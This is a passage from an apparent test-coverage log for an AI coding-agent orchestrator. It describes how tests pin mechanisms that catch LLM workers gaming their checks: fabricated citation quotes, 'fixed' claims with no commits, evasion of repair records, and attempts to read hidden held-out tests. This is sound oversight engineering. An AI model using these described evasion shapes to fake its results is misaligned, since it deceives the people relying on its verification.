stays quiet; a branch shadowed by a same-named tag (recorded as
`heads/<name>`) is still followed by both scripts and `_base_tree_sha`.
Task-reference staging (`_switched_branch_only_paths`): a deliverable or a
`.claude/` file committed only on the switched-to branch is not staged,
while an untracked report, a `git add`-ed-but-uncommitted document, an
untracked `.claude/` and a file committed on the run's own branch after
the reset all are — and gating is per file, so an untracked spec beside a
switched-branch file under the same glob, and an untracked
`.claude/settings.local.json` beside a switched-branch `.claude/` file,
are still staged. Set tests cover literal matching of `[`-bearing names
and an `ls-tree` failure (only that call fails) giving the empty set; the
`refs/heads/<name>` form is accepted by `_working_branch_ref` and both
scripts. A skipped task-named file is named in a WARNING, and an
undecodable `ls-tree` gives the empty set while staging carries on with
the other references.

**Delivery gate**, in `tests/test_delivery_gate.py`: sample counts are
the observable (1 on a clean first pass, 3 when flagged — a gate that
always or never votes fails the count assertions); majority truth table
(omitted index = met vote, last duplicate wins, garbage indices);
executed recheck for both remedied and residual; both resume sentinels;
the conformer section text (the routed VALUE); `_run_phases` ordering
pins. Falsified live: flattening the majority threshold fails 3 tests.
The finding-level contract verdict (DESIGN §8 *The gate judges the
finding, not only the items*) is covered by executed-gate arms in the
same file: a flagged contract buys the 3-sample vote (count
assertion) and the +12 budget allowance (54 at the harness's two
items, where item-only arithmetic gives 42 — the pinned pair
discriminates; item-only alone reaches 54 at four
items); persistence of
`contract_before`/`contract_after` with the winning sample's evidence
VALUE; the 1-1-1 split failing open to met; a conflict ALONE
persisting both contracts and skipping the recheck, while a
conflict alongside unmet items DOES buy the recheck and a met
verdict there lands in contract_after
(test_pre_pass_conflict_with_unmet_items_rechecks_the_contract);
contract-only-unmet triggering the recheck; the formatter's
DEFECT CONTRACT block carrying the evidence value; and the
EXECUTED COMMANDS RECORD section reaching the
judge's actual payload from a synthetic worker log.
`tests/test_finding_level_gate.py` covers the non-judge halves:
`_executed_commands_digest` (BLT-verb filter, verbatim result tails,
no-result and missing-log arms, entry cap),
`_prior_delivery_residual` (newest same-task run wins; a newer CLEAN
same-task run stops the lookback rather than resurrecting a resolved
residual; contract-unmet and contract-conflict record shapes; no
siblings/empty task), and the cross-run `prior_delivery_residual`
planner-ctx injection driven through the REAL `phase_plan`
(evidence text reaches the planner prompt verbatim; the common
no-residual case carries no key), plus the planner-prompt
documentation pin. Round-1 review arms in the same files: the
recheck call-site pin (`test_recheck_spawns_on_either_flagged_half`
— the contract-only case's recheck was dead when the call site
gated on the items list alone); the `timeout`/env-prefixed digest
arms (a dropped prefix turned a real execution into a confident
false unmet); and a recheck met-verdict superseding a pre-pass
conflict. Round-2 arms: the crashed-newer-run SKIP keyed on
orchestrator.exit_code — the decisive shape is the die() crash,
which WRITES finished_at (a discovery sentinel, not completion)
plus a nonzero exit code, so a finished_at-keyed filter was
falsified against live telemetry, and a rerun-after-crash must not
hide the last completed residual; digest failure degrading to
items-only judging (the real prejudge runs, the record section is
absent, and without the degrade guard the raised error would
escape — the crash-or-not outcome is the discriminator); the
contract-only formatter header claiming no unmet items while the
with-items header still does; and a conflict DISCOVERED at the
recheck landing in contract_after with both contracts. The
paid-but-empty audit's log line is pinned in
`tests/test_defect_scope_audit.py` (executed phase, capsys).
The judge's item-scaled turn budget (`min(30 + 6*items, 90)`,
DESIGN §8 *The judge's turn budget scales with the item count*) is
pinned by a parametrized consumer-executing test asserting the
`max_turns` value `claude_p` RECEIVES for disagreeing item counts —
1→36, 9→84 (the measured incident's larger list), 11→90 (the first
clamped count), 20→90 — so a hardcoded bypass fails multiple params.

**Ground-truth availability and the `unverifiable` verdict (S-4,
DESIGN §5 *Report-named ground truth* / §8's unverifiable rule).**
In `tests/test_delivery_gate.py`, executed through the real
prejudge against the real filesystem: the load-bearing downgrade
arm (a judge claiming met while the audit is data-dependent and
every named input is absent persists as `unverifiable` with
`judge_claimed: "met"` and both evidence halves, at one sample —
the exact silent shape two consecutive live v0.33.0 gates
shipped); its converse (all inputs present → met stands, no
availability section); the partial case (per-input PRESENT/ABSENT
lines in the payload, no downgrade — each of the three availability
fixtures' audit-time `present` flags deliberately DISAGREES with the
filesystem, so a gate trusting the stale record fails);
`unverifiable` as a first-class 2-of-3 tally verdict with the last
winning sample's evidence; `unverifiable` never buying the
recheck (`_delivery_recheck_due` False, zero samples spent); the
VOTED-path downgrade (round-1 falsification gap: deleting that
call left the suite green because every availability fixture
exited through the 1-sample early return — the arm forces the vote
with a 1-of-3 item flag while all three samples claim met over an
all-absent ground truth, and asserts the downgrade's verdict at
three calls); and the two voted-unverifiable log arms (no ground_truth, and
absent-inputs-on-a-NOT-data-dependent audit — round 2's corner:
the operator line states the judge's evidence and asserts the
ABSENCE of the --inspect-dir remediation and the data-absence
narrative, which the orchestrator's own record never established;
the second arm's payload still lists the absent input factually). In
`tests/test_finding_level_gate.py`: the `contract_unverifiable`
residual carrying exactly the sibling audit's absent paths in
`missing_inputs` (the present one excluded), and a recheck met
superseding a pre-pass unverifiable (same after-outranks-before
rule as conflict).

**Ground-truth resolution and the repro-decides duty (S-5, DESIGN
§5 *Resolution is the auditor's judgment* / §8's present-inputs
paragraph).** In `tests/test_delivery_gate.py`, executed through
the real prejudge: the load-bearing resolution arm reproduces the
live incident's exact shape — verbatim path absent,
auditor-resolved mount EXISTS → presence comes from the
resolution, the downgrade does NOT fire, and the payload names
"PRESENT at <resolved>"; all-present WITH a repro emits the
converse-duty section naming the repro — presence at the shown
locations only, never executability (met stands);
all-present WITHOUT a repro stays silent. In
`tests/test_defect_scope_audit.py`: the four-way resolution truth
table against the real filesystem (container view; host view with
the winning probe recorded; dangling resolution kept on the record
for the gate's re-probe; null), the phase persisting
`resolved_path`/`repro_command`, and three documentation pins
(auditor: resolution is a verified claim, never a guess; planner:
the acceptance-subtask directive; judge: the repro-decides rule).
Round-1 arms in `tests/test_finding_level_gate.py`: the digest's
repro-verb widening on the measured failure shape (a node-led
repro on a pnpm-verbed repo is EXCLUDED without `repro_command`
and included with it — the two calls disagree, so a widening that
ignores the parameter fails) and `_repro_verbs`' lead-strip/
multi-segment/garbage truth table. The availability-sentence pin
asserting the ABSENCE of the retired "executable against them"
claim (the orchestrator states presence, never unverified
executability) lives in `tests/test_delivery_gate.py`, inside the
all-present-with-repro arm. Round 4's hardening pin
(`tests/test_defect_scope_audit.py`): the `ground_truth` REQUIRED
lists are value-asserted — `resolved_path` and `repro_command` are
attestations the gate depends on and must not be skippable by
omission (the `change_shape` precedent; null stays the honest
unfound/no-repro answer).

In `tests/test_defect_scope_audit.py`, executed
through the real phase: the one-shot empty-enumeration re-ask
(recovered sites become the scope, exactly two calls, the
corrective prompt carries the previous answer; a re-ask crash
keeps the empty answer at two calls; a flip to not-applicable is
honored; non-empty sites never re-ask), `_check_ground_truth_inputs`
(per-input filesystem truth with `~` expansion — the two inputs'
answers disagree, so a hardcoded bypass fails; malformed shapes
tolerated), and the persisted `ground_truth` plus the loud
`--inspect-dir` remediation log (capsys, path value asserted).
The HEAD-probe/pre-schedule cap asymmetry is pinned from both sides:
40 on the executed helper in
`tests/test_mid_run_satisfied_no_commits.py`, 20 on the executed
filter in `tests/test_probe_typed_reason.py`.

**Defect-scope audit**, in `tests/test_defect_scope_audit.py`: the phase
executed for the bug-fixing / not-applicable / crash / malformed-site
arms; ctx delivery through the real `phase_plan` asserting the BYPASS
site's symbol reaches the planner (the historically-missed role); the
mechanical floor's file-set normalization (dot-prefix) and
silent-when-inapplicable arms.

**Defect-scope trigger calibration (unconfirmed-cause reports)**: the
evidence base is live telemetry plus a host bench, not a pytest file —
the prompt change is advisory surface with no new code path to pin. On
the audit's first two live runs (one task, 2026-09-28) the auditor
declined with reasoned multi-turn rationales (8 and 11 turns), each
reasoning inside the stock prompt's not-applicable carve-out. A
six-arm host elimination ladder (same tree, same report, verbatim
live `user_content`) accepted on all 13 control replicates across
every component of the live worker path — free-form (3),
`--json-schema` (2), exact live framing (2), `sonnet[1m]` (2), the
real `_StrictOutputProxy` driven standalone (2), and a
container-equivalent arm (image CLI version, credentials-only config,
full worker argv) (2) — so no single component drives the decline
(the best-fit shared rate makes the observed split's joint likelihood
≈0.3%; an exact placement test — both declines landing in the 2 live
slots of 15 trials, 1/C(15,2) — gives ≈1%; either way the split is
not sampling noise). The calibrated prompt
forecloses the carve-out reasoning by name; its one host replicate
enumerated candidate-mechanism sites on the same input, but is
NON-discriminating (the stock control also accepts on the host), so
the calibration's real test is live. That live confirmation lever is
the next run's `state.data["defect_scope"]`: `applicable: true` with
sites confirms; two more declines falsify the calibration. Guard
rails that do run in pytest: the foreign-identifier scan over both
edited prompts (`tests/test_prompts_have_no_foreign_identifiers.py`)
and the existing `tests/test_defect_scope_audit.py` arms —
prompt-agnostic except `test_planner_prompt_documents_the_key`,
which pins the `defect_scope`/`chokepoint` mentions in the planner
prompt.

## Self-reported risk routing (2026-10-01)

One diagnosis (the phoenix GDPR-deletion run, leerie v0.32.2: a planner
criterion quoting an external API's message wording propagated through an
honest-but-unconsumed implementer disclosure into shipped brittle code;
DESIGN §9 *Self-reported risk is routed, not read* and *The success
criteria are not the ceiling of this attack*), five surfaces:

**The routing helpers**, in `tests/test_risk_register.py`: the incident
pin (an `exercised: false` + valid `unexercisable_reason` result — the
exact shape `check_production_evidence` passes silently — must land in
`_collect_subtask_risks` with the reason text asserted by VALUE); the
two-tier union and malformed-entry drops; the fail-safe disposition
union (conformer silence, `accepted`, `confirmed_defect` — never
addressed by design, its act gates instead — an unrecognised or
non-string item, and a `mitigated` with neither a `fixed: true` defect
entry nor a `kind: "tests"` `file_updates` entry each leave the risk
unaddressed — inputs disagree per case); positional mapping pinned
against `_format_self_reported_risks`'s own item order; schema
substance (the implementer enum really rejects an unknown kind); the
rollback neutralization (`conformer_repair_rolled_back` present with
both repair records → not addressed); the renderer's
work-not-in-the-PR filters (a `blocked` sid skipped; an
`accepted_blocked` sid skipped despite its rewritten `complete`
status; malformed status/registry values degrade instead of raising);
and the EXECUTED settle path (`test_settle_success_path_populates_and_pops_the_register`
drives the real `_settle_subtask` — mutation-
probed: dropping the `impl_res` threading, the register write, or the
pop each kills it — plus the confirmed-without-filing advisory
warning).

**Conformer threading**, in `tests/test_run_conformance_phase.py`:
behavioral probes that execute both consumers — `_run_conformance_phase`
threads the challenge text (detail values, not a key) into the
`_run_conformer` call, a risk-free result threads `None`, and the real
`_run_conformer` renders a given block into the worker's user prompt.
The same file carries the producer-side survival pins for
`conformer_repair_rolled_back`, one per flag-setting arm (six
assignment sites) plus the evasion shapes: protected-path rollback
(`test_protected_path_rollback_neutralizes_repair_records`),
strict-clobber rollback
(`test_strict_clobber_rollback_neutralizes_repair_records`), the
honesty-validator rejection
(`test_malformed_result_neutralizes_repair_records`), the
committed-by-this-pass rule
(`test_zero_commit_pass_citing_committed_path_is_neutralized` — a
cited path absent from the phase's own diff;
`test_zero_commit_fixed_claim_is_neutralized` — fixed:true with zero
phase commits; and the positive control
`test_committed_cited_repair_is_not_neutralized`, proving a real
committed repair still clears), and the clean-tree gate (I1, DESIGN
§8 *A worker leaves its tree clean*): a round left dirty past its re-asks
is rolled back and neutralized
(`test_conformer_left_dirty_is_rolled_back_and_recorded`), one committed
on the re-ask keeps its repair
(`test_conformer_reasked_commits_and_its_repair_counts`), and the cited
path is canonicalized before it meets the phase's diff
(`test_noncanonical_spelling_of_a_committed_repair_counts`). The I1 gate
replaced the uncommitted-tests-path check that parsed `-z -uall`
porcelain; its pins (the porcelain-evasion, directory-citation,
rename-origin and sibling cases, 15 collected cases) were deleted with it,
since a tree the gate passed has no uncommitted path to cite, and its
canonicalization pin was rewritten onto the phase-diff match. The gate itself, at every
worker site, is pinned in `tests/test_clean_tree_gate.py` and beside the
implementer, conformer and final-conformer harnesses.

**The PR composition renderers** (two live paths plus `compose_pr_body`,
the never-invoked canonical reference the bash fallback mirrors):
`tests/test_compose_pr_body.py` (reference renders details verbatim;
empty register renders no heading),
`tests/test_pr_writer_git_helper_bounded.py` (the LLM path appends the
section to the accepted body BEFORE the run.json write, appends nothing
on an empty register, and owns the `_strip_worker_risk_sections`
guarantees: a worker-emitted section stripped even with an empty
register, a mid-body copy removed span-limited with trailing sections
surviving, a fence-quoted heading left alone — with fence state
tracked per fence line, so an inline ``` in prose does not flip it and
`~~~` fences are honored
(`test_strip_fence_detection_survives_inline_backticks_and_tildes`) —
the section END equally fence-aware so a fenced `## ` line inside the
section is not a boundary (`test_strip_section_end_is_fence_aware`),
and the U+FE0F variation-selector heading still matched), and
`tests/test_host_finalize_sh.py` (the bash fallback appends run.json's
`pr_end_state` as-is and never re-renders state itself — the jq mirror of
the retired risk dump is gone, so there is no second renderer to drift).

**The PR's end-state section** (DESIGN §6 *The PR's end-state section is
rendered by code, from typed state*), in `tests/test_pr_end_state.py`: the
renderer executed on a state carrying every source, asserting each rendered
line and the order of the six headings; integration content loss under its
own heading, not as a worker risk; caps on the advisory lists; entry text
that cannot open a heading; malformed state rendering nothing; and the strip
of a worker-emitted copy of every code-owned heading, whole-line anchored.
`tests/test_finalize_execution.py::test_phase_finalize_writes_the_end_state_after_the_outcome`
pins that `pr_end_state` is rendered after `_decide_outcome`.

**A site resting on an untyped resolution is settled by the run** (DESIGN §8;
the user's 0.44.0 run 48c48629, barnacle#665, listed a `surface_other` site
under "Needs human verification"), in `tests/test_untyped_site_settlement.py`
(5 functions): such a site renders no "Needs human verification" entry
whether unsettled, voted unresolved or settled; a settled one renders
nothing; an unsettled one is under "Not verified by this run", with the
judge's evidence when it
gave one; and `_delivery_judge_unmet`, its judge stubbed, asks for the site
in the contract pack's prompt (and not for a typed site), settles it on a
`resolved` vote whose quote is the tree's own line, and settles nothing on
a fabricated quote, an empty `cites` or a `resolved: false`.
`tests/test_pr_end_state.py`'s full-state line moves to that section.
Falsified 2026-11-04: on the parent's code all 5 and the full-state case
fail; with the citation check replaced by `True`, the fabricated-quote case
fails.

**Only a typed external resource reaches "Needs human verification"**
(DESIGN §6; the user's runs 48c48629, barnacle#665, and ebe36d49,
barnacle#670, listed a fix site to read, a confirm budget that ran out and
intermittent test IDs there), in `tests/test_needs_human_sources_render.py`:
`test_only_a_typed_external_resource_reaches_needs_human` builds one state
with an entry of every source — every `needs_human_verification` source
derived from the code, a blocker and an external risk with and without a
resource, a simulated interleaving, an unmeasured held-out set, an
intermittent failure, an unsettled untyped site — and fails on any line
under "Needs human verification" that is not a typed external entry, or on
any other entry missing from "Not verified by this run"; the per-source
case places each derived source in its section. Callers that read the
non-external groups moved from `_pr_needs_human` to `_pr_not_verified`
(`test_bstar_confirm`, `test_bstar_sized_passes`, `test_test_outcome_settlement`,
`test_nhv_one_fact_instruction_first`, `test_forbidden_commands`,
`test_bstar_one_off_flake_budget`, `test_final_test_id_diff_ships`), and
the body-reading cases (`test_delivery_detection`,
`test_acceptance_held_case_intermittent`, `test_acceptance_unmeasured_pr`,
`test_risk_register`, `test_pr_end_state`, `test_untyped_site_settlement`)
read the new section.

**The coverage re-drive** (DESIGN §9 *Changed lines no test executes are
re-driven*), in `tests/test_coverage_redrive.py`: real git worktrees and a
stand-in `node_modules/.bin/vitest` that speaks vitest's JSON reporter and
the v8 `coverage-final.json`, so the detector (pass-only counting, the
importing-test settle with mocks excluded, helper modules excluded), the
threshold, both re-drive rounds with round 2's "NOT ADDRESSED" line, the
spent-budget `untested` listing, the rollback of a re-drive that does not
complete, the resume skip and the typed-gap settles (`test_missing` by an
importing test, `typecheck` only for a file in `tsc --listFiles`) run
unmodified.

**The gating robustness kinds**, in `tests/test_solution_defects.py`:
`external_contract_assumption` / `unrevalidated_precondition` pass the
anti-gaming filter, render in the retry feedback, and the schema enum
admits them while rejecting an invented kind.

**The conformer schema's size budget**, re-pinned in
`tests/test_conformer_schema_size.py`: bounds re-measured 2026-10-01
(dumped 2,690/2,750; hardened 3,143 against `_MAX_HARDENED_BYTES` now set
to 3,178 — the MEASURED pre-N29 grammar-compiler failure point, so
reaching the bound is the regression itself, not a margin). The shapes
rejected as unaffordable (an item object, an enum on the disposition
strings) are recorded in `_risk_dispositions_schema`'s docstring; the
value set is enforced in Python instead, which is also why
`risk_dispositions` carries no enum for the parity sweep to require.

## Leaked tool-call markup and the strict-output CLI floor (2026-10-04)

On CLI 2.1.280 with `--dangerously-force-strict-output`, strict decoding
absorbed the model's own tool-call markup into a string field
(`…</defect_shape><parameter name="sites">…`) and emptied the remaining
fields — schema-valid, content destroyed (DESIGN §7). Measured on a recorded
v0.36.0 `defect_scope_auditor` call: 4/4 leaks with the proxy, 0/4 without,
0/4 with it on 2.1.289.

`tests/test_protocol_markup_guard.py` pins both layers:

- **The detector** (`_find_protocol_markup`): each fixed token; a closing tag
  named after one of the worker's own schema properties (and NOT an
  unrelated `</div>`); backtick-quoted protocol text ignored (the one
  legitimate hit in a 120-sample corpus audit had that shape); recursion into
  nested dicts/lists; `_schema_property_names` reaching nested `items`; and
  `_validate_result`'s `corrupted_envelope` arm delegating to it.
- **`claude_p`**: a leaked first answer is re-prompted (attempt-2 prompt names
  the leak) and the clean retry is returned; two leaks raise `WorkerError`;
  a clean first answer is untouched. Falsified: disabling the check turns the
  re-prompt and two-leak tests red.
- **The floor**: `MIN_CLAUDE_CLI_STRICT_OUTPUT == (2, 1, 289)` and stays above
  `MIN_CLAUDE_CLI`; `_check_strict_output_cli_version` dies below, passes at
  the floor, defers on an unparseable version; and real `main()` with the flag
  on and a 2.1.280 stub dies with the floor's own message (falsified by
  removing the call).

`tests/test_retryable_failure.py` follows the rename
(`_find_antml_markup` → `_find_protocol_markup`).

## The report's own example inputs (2026-10-04)

Both repeat runs on v0.36.0 traced to a first run whose fix failed on the
report's own quoted input (executed against run 1's shipped code): the tests
paraphrased the input and dropped the triggering feature (DESIGN §5 *The
report's own example inputs are captured too*).

`tests/test_inline_examples.py`:

- **Passthrough.** The executed audit phase carries
  `ground_truth.inline_examples` (literal, `site_identifying`,
  `trigger_tokens`, `site_tokens`) into the scope by value; malformed entries
  (prose, missing literal, empty tokens) are dropped. Falsified: emptying the
  passthrough turns three tests red.
- **Planner.** Driving the real `phase_plan`, the example literal reaches the
  planner's user prompt, and the planner system prompt carries the
  verbatim-test directive.
- **Advisory site-token check** (`_warn_site_token_leaks`), against a real git
  repo: a token the run's diff adds is reported with its file and recorded in
  `site_token_warnings`; a token already in the base tree is skipped (the
  measured false-positive source — falsified by removing the skip); a partial
  word is not a hit; no examples means no check. Word boundaries are `\w`,
  so `AcmeShop-style` is a hit, as `git grep -w` would also see it.
- **Order.** In `_run_phases` the check runs after `phase_execute` and before
  `_run_delivery_prejudge`, inside an `except Exception` (advisory). Falsified
  by removing the call.

`tests/test_defect_scope_audit.py::test_ground_truth_attestations_are_schema_required`
now pins `inline_examples` (and its item's four fields) as required.

## Per-site dispositions in the defect-scope audit (2026-10-04)

The dominant cause of serial narrow fixing (5 of 11 historical repeat pairs)
was the audit: the site a later run had to fix was usually already LISTED,
as a "consumer" left to mechanical consequence (DESIGN §5 *Every site
carries a disposition*).

`tests/test_site_dispositions.py`: the site schema requires `disposition`
(`fix` | `ruled_out`) and has no separate `evidence` field, and the
top-level schema has no `already_resolved_on_tree` (both pinned as absent,
with the measured strict-decoding reason in the test); the executed audit
phase keeps each site's disposition and its `note` evidence;
`_warn_defect_sites_uncovered` names an uncovered `fix` site and never a
`ruled_out` one (falsified by removing the filter: 2 red), stays quiet when
every `fix` site is claimed, and still warns on a legacy site without a
disposition; both prompts carry their rule.

Live strict-mode replays of a recorded v0.36.0 auditor call (CLI 2.1.289)
chose the shape: dispositions alone came back non-empty 6/6, the prior schema
10/10, while every variant that also carried a top-level
`already_resolved_on_tree` boolean returned `sites: []` in 5 of 18 calls —
so that flag was dropped.

## Held-out acceptance tests (2026-10-04)

Every verification layer before this graded a fix against tests the fixing run
wrote itself (DESIGN §8 *Held-out acceptance tests*).
`tests/test_acceptance_gate.py` runs the REAL write/validate/gate code against
a real git repo with a real pytest `test_scoped` command; only `claude_p` is
stubbed, and the stubs write files the way the workers would.

- **Validity by exit code.** A file the test command cannot run (not test-shaped,
  runner missing) discards the set with an honest "could not run" reason. A
  defect file that passes on the validity base is
  dropped (it cannot discriminate); a failing control discards the set; a set
  with no discriminating defect file is discarded; kept files land under
  `<run_dir>/acceptance/set-<k>/`, the disposable worktree is removed and the
  user's checkout stays clean. The writer is shown the defect contract, the
  inline examples and the referenced report, at `medium` effort, as an acting
  worker.
- **Skips** (no `bug-fixing` category, `--skip-acceptance-check`) are recorded
  with their reason.
- **Report base** (informational, never a filter): the earliest same-task
  sibling's starting HEAD; a different task is ignored.
- **Evaluation** never overwrites, or runs in place of, a file the run itself
  put at the same path, and removes what it copied.
- **Repair**: one fixing round at `EFFORT_ACCEPTANCE_REPAIR == "high"`, its
  prompt naming shown sets' cases and never the hidden two; an unfixed tree
  gets exactly two rounds and ships with a residual; a repair that turns the
  test axis red is `git reset --hard` away (`rolled_back`); the gate is
  resume-idempotent on `gate.final`.
- **Cross-run**: the residual reaches `_prior_delivery_residual` as
  `acceptance_unmet`, and the planner prompt carries guidance for it.
- **Hiding**: no fixer's grant (`_worker_grants`: implementer, conformer,
  surrogate_fixer, falsifier) reaches the sets or any run file that records
  them, and no worker's argv carries a `Read(` deny.
- **Order**: in `_run_phases`, audit → acceptance write → plan, and
  delivery recheck → acceptance gate → finalize.

Falsified five ways, each turning at least one test red: repair at the
conformer's own effort; no hidden sets; no rollback; keeping
non-discriminating defect files; no Read deny.
`tests/test_repo_write_denial.py` now asserts the write deny's presence rather
than its position, and (since the CLI `Read` denies went, Landlock refusing
those reads instead: `tests/test_worker_confinement.py::test_no_fixer_reads_what_records_a_held_out_set`)
that no `Read(` deny is on the argv, for a judgment worker and an
implementer — both cases fail with the denies back, and the implementer's
old assertion of `/acceptance/**` was red from that change on; the registry tests (`test_resolve_models`,
`test_resolve_efforts`) list the new worker.

## No work on executed evidence, with a bounded dispute (2026-10-04)

A no-work confirmation used to end the run on the read-only judge's word;
one such confirmation declared done a defect that report-shaped tests still
reproduce on barnacle's HEAD (DESIGN §8 *No work is declared on executed
evidence, and a dispute is bounded*; "at most once" until 2026-10-06, when
an unacted dispute gained one re-dispute).

`tests/test_acceptance_no_work.py`:

- **Hold.** With acceptance available (not skipped, `bug-fixing`, a scoped
  test template), a confirming judge leaves `no_work_pending` and does not
  finish; without any of the three it finishes at once, as before.
  Falsified by disabling the hold.
- **Settle.** Passing sets → no work (`verdict: pass`); failing sets with no
  prior dispute → `acceptance_dispute` plus a `no_work_dispute` whose evidence
  names only the failing cases, pending cleared, planning continues; failing
  sets after a prior dispute → no work with a WARNING and the dispute marker
  re-recorded with `accepted: true` — carried forward, not a new dispute
  (falsified by removing the accept-after-dispute branch); no valid sets → the
  judge's confirmation stands.
- **Prior-dispute lookup.** Only the newest COMPLETED same-task sibling counts;
  another task's or a crashed run's record is ignored.
- **A4.** `_acceptance_passes_on_head` over no sets, a passing and a failing
  majority; in `_run_phases` the fix-subtask set is taken before the
  satisfied-probe sweep and re-checked after it, gated on that helper, and the
  pending settle runs after the acceptance write and before planning. The A4
  routing itself is pinned behaviourally (round-1 fixes below); only its
  placement in `_run_phases` is a source-order pin.

### Review round 1 fixes (2026-10-04)

The first adversarial review round found the held-out machinery could read
"no evidence" as "pass", could be gamed or sunk by one writer's output, and
that the protocol-markup check flagged ordinary markup. Each fix is pinned
below. (The round-1 commit claimed every reversion turned exactly one test red;
round 2 measured that as false — reverting the absolute-path rejection turned
none red, and several smaller fixes had no test. Round 2 added the missing
tests; see below.)

- **Unrunnable ≠ passing** (`test_unrunnable_files_never_count_as_passing`,
  `test_unmeasurable_sets_keep_the_judges_confirmation`): a file the runner
  cannot run, or a path the target tree already uses, marks the set
  `unmeasured`; unmeasured sets are left out of the vote, and nothing measured
  is "no evidence" (the judge's confirmation stands), never a pass.
- **New files only, in code** (`test_writer_editing_an_existing_file_is_not_kept`).
- **One writer cannot sink the rest**
  (`test_absolute_path_is_rejected_and_one_writer_cannot_sink_the_rest`):
  absolute and `..` paths are rejected, and any per-writer exception only
  discards that set.
- **Disputed at most once, really** (the rule as of this round; since
  2026-10-06 an unacted dispute is re-raised once —
  `test_a_second_failing_run_accepts_no_work`
  asserts the carried-forward marker; `test_a_third_run_still_does_not_dispute`).
- **Ties are not a passing majority** — superseded by the any-failing rule
  (`_acceptance_any_fails`; `test_majority_rule` was rewritten as
  `test_any_failing_set_fails`).
- **No residue** — superseded in round 4: evaluation no longer writes the
  target tree at all (`test_evaluation_never_touches_the_tree_and_never_overwrites`).
- **Markup check precision** (`test_ordinary_markup_named_like_a_schema_field_is_not_a_hit`):
  fenced code is stripped, and a schema-named closing tag counts only where
  leaked syntax sits; the leaked shapes still hit.
- **A4, behaviourally** (`test_every_fix_already_on_head_routing`, four cases,
  and `test_already_fixed_check_errors_proceed_with_the_plan`), now through
  `_finish_if_every_fix_already_on_head` rather than a source-order pin alone.

### Review round 2 fixes (2026-10-04)

The round-2 commit claimed 18 reversions of its fixes, 17 caught. Round 3
measured five more of that commit's fixes with no catching test (the
call-site `WorkerError` re-raise, `_gather_or_cancel`, the scoped cleanup, a
failed snapshot cleaning nothing, the per-round save); round 3 added them (see
below). Removing the explicit save after `pre_tests_passed` is an equivalent
mutant: `bump_workers` saves state before the round's worker starts, with
nothing awaited in between. The save is kept so persistence does not rest on
that coincidence.

- **Undeclared helpers travel with the set**
  (`test_undeclared_helper_travels_with_the_set`): a file the writer created
  but did not declare becomes a `support_files` entry; without it a correct fix
  failed the set at evaluation. (Round 3 widened this to test-shaped paths.)
- **A writer may not edit tracked files**
  (`test_writer_editing_a_tracked_file_discards_the_set`), read from
  `git status --porcelain -z`.
- **Absolute paths, really** (`test_absolute_path_is_rejected_and_one_writer_cannot_sink_the_rest`
  now has set 1 declare an absolute AND a relative file: rejected, the set
  survives on the relative one; unrejected, the self-copy discards it).
- **Resume mid-repair** (`test_resume_mid_repair_still_rolls_back_a_red_repair`,
  `test_pre_repair_state_is_persisted_before_the_first_round`): `before_sha` and
  `pre_tests_passed` are on disk before round 1, and spent rounds count.
- **Budget exhaustion mid-repair still rolls back**
  (`test_budget_exhaustion_mid_repair_still_rolls_back`); in the writer it
  still propagates (`test_writer_budget_exhaustion_propagates`).
- **Cap, concurrency, deps** (`test_repair_rounds_follow_the_cap`,
  `test_writers_respect_max_parallel`, and — since round 4 installs in the
  evaluation worktree — `test_evaluation_installs_deps_before_running`).
- **Created directories** — a round-1 behaviour first pinned in round 2, removed
  in round 4 with in-tree evaluation (a disposable worktree makes it moot).
- **Validity base** skips an undated sibling — now the informational
  report base (`_acceptance_report_base`; the validity tree is the run's own
  start), pinned by `test_report_base_prefers_the_earliest_same_task_sibling`.
- **No claim of hidden tests that do not exist**
  (`test_no_hidden_sets_means_no_claim_of_hidden_tests`).
- **Counts over measured sets only** (`test_residual_counts_only_measured_sets`,
  `test_dispute_counts_only_measured_sets`); `_acceptance_passes_on_head`
  reads nothing-measured as not passing (`test_passes_on_head_helper`).
- **Settle fails open** (`test_settle_errors_fail_open_to_the_judges_confirmation`,
  through the extracted `_settle_pending_no_work_failing_open`).
- **Fenced code in the markup check** is matched line-anchored, so a stray
  inline triple backtick cannot swallow a leak
  (`test_ordinary_markup_named_like_a_schema_field_is_not_a_hit`).

### Review round 3 fixes (2026-10-04)

Each pin was falsified by reverting its fix and running the named test: 19
reversions (14 covering round-3 fixes, 5 covering previously unpinned round-2
fixes), 19 caught. One round-3 fix — saving an errored round — had no
reversion and no catching test; round 4 added it. Round 4 replaced the
in-staging cleanup pins below with a disposable evaluation worktree.

- **Resume never skips the rollback check**
  (`test_resume_after_a_passing_but_red_round_still_rolls_back`, with and
  without a persisted `initial`): the pre-repair verdict is persisted and
  reused, and a recorded `before_sha` resumes the repair branch; the shipped
  pre-repair tree keeps its own verdict and residual.
  `test_resume_after_a_passing_round_runs_no_further_round`,
  `test_every_round_is_on_disk_before_the_rollback_check`,
  `test_the_pre_repair_verdict_is_on_disk_before_round_one`.
- **Helpers beside the tests travel; caches and the install's output do not**
  (`test_helper_beside_the_tests_travels_with_the_set`,
  `test_cache_and_provision_paths`).
- **Fixers cannot Read the writers' transcripts, evaluation logs or
  `calls.ndjson`** (`test_fixers_cannot_read_the_sets`; widened in round 4).
- **No hidden test id survives in staging**
  (now `test_a_runner_cache_in_the_tree_is_never_touched`).
- **Cleanup is scoped** — removed in round 4 together with in-staging
  evaluation (its two tests went with it).
- **Budget exhaustion stops the run and the other writers**
  (`test_write_or_skip_lets_budget_exhaustion_stop_the_run`,
  `test_budget_exhaustion_cancels_the_other_writers`).
- **Indented fences are quoting** (`test_indented_fenced_code_is_quoting_not_a_leak`).

### Review round 4 fixes (2026-10-05)

Each pin was falsified by reverting its fix and running the named test: 19
reversions, 19 caught (one, the errored-round save, only after its test was
made to commit before erroring).

- **Evaluation in a disposable worktree**
  (`test_evaluation_never_touches_the_tree_and_never_overwrites`,
  `test_a_crashed_evaluations_worktree_is_replaced`,
  `test_sets_are_isolated_from_one_another`): a crash mid-evaluation used to
  leave hidden tests in staging for the next fixer to read or commit, and make
  every later evaluation of those sets unmeasured.
- **Declared `./` paths** (`test_dot_slash_declared_paths_are_not_also_support_files`)
  and **gitignored helpers** (`test_a_gitignored_helper_still_travels`).
- **Exit-code verdicts** (`test_verdict_is_by_exit_code`,
  `test_an_unrunnable_command_is_no_verdict`): a failing missing-file test is a
  failure, not an unrunnable runner.
- **No echo** (`test_runner_output_never_reaches_the_orchestrator_log`) and the
  widened deny list (`test_fixers_cannot_read_the_sets`).
- **Rollback decision first** (`test_the_rollback_decision_is_on_disk_before_the_reset`,
  `test_resume_after_the_rollback_decision_finishes_the_reset`) and **errored
